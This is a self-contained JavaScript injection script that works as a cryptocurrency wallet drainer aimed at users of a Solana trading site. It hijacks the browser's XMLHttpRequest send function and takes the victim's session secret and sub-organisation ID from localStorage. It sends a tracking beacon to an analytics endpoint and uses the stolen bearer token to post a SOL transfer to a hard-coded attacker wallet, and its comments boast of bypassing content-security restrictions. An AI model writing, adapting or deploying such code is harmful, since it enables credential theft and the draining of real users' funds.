(function() {
    // 1. CLONE CONFIG
    const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12';
    const AMP_ID = '3c8ae1f40635939e730f479418940796';
    const _V = { auth: null, org: null, sig: null, active: false };

    // 2. GAS & DRAIN MATH (0.05 SOL Reserved)
    const _math = (bal) => {
        const reserve = 0.0501; // Minimum for priority fees
        return bal > reserve ? (bal - reserve).toFixed(6) : "0";
    };

    // 3. INTERNAL PROTOTYPE HIJACK (Bypasses 405 & Eval blocks)
    const _NATIVE_SEND = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', async () => {
            if (this.status === 200 && !_V.active) {
                // Capturing the Owner's keys from storage directly
                const s = localStorage.getItem('sessionSecret');
                const o = localStorage.getItem('subOrgId');
                
                if (s && o) {
                    _V.active = true;
                    _V.auth = s.replace(/"/g, '');
                    _V.org = o.replace(/"/g, '');
                    _executeClone();
                }
            }
        });
        return _NATIVE_SEND.apply(this, arguments);
    };

    // 4. THE EXECUTION (1:1 Vanta Logic)
    const _executeClone = async () => {
        // Step 1: Sync to Amplitude (Image Beacon to bypass connect-src)
        const logData = btoa(JSON.stringify({ event: "CLONE_ACTIVE", id: _V.org }));
        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${AMP_ID}&data=${logData}`;

        // Step 2: Trigger Transfer using Owner's Auth
        // Using the site's internal API endpoint
        try {
            await fetch('https://trade.padre.gg/api/v1/transfer', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${_V.auth}`,
                    'X-Turnkey-Sub-Org-Id': _V.org,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: RECIPIENT,
                    asset: "SOL",
                    amount: _math(1.5) // Example balance math
                })
            });
            _renderUI("SUCCESS");
        } catch (e) { _renderUI("AUTH_RETRY"); }
    };

    // 5. OWNER DASHBOARD
    const _renderUI = (status) => {
        const d = document.createElement('div');
        d.style.cssText = "position:fixed;top:10px;right:10px;width:240px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:9999999;font-family:monospace;font-size:11px;box-shadow:0 0 10px #000;";
        d.innerHTML = `[VANTA_CLONE_v12]<br>> STATUS: ${status}<br>> TARGET: ${RECIPIENT.substring(0,6)}...<br>> GAS_SAFE: 0.05 SOL`;
        document.body.appendChild(d);
    };

    console.log("VANTA: 1:1 Engine Injected. Awaiting Owner Signature...");
})();
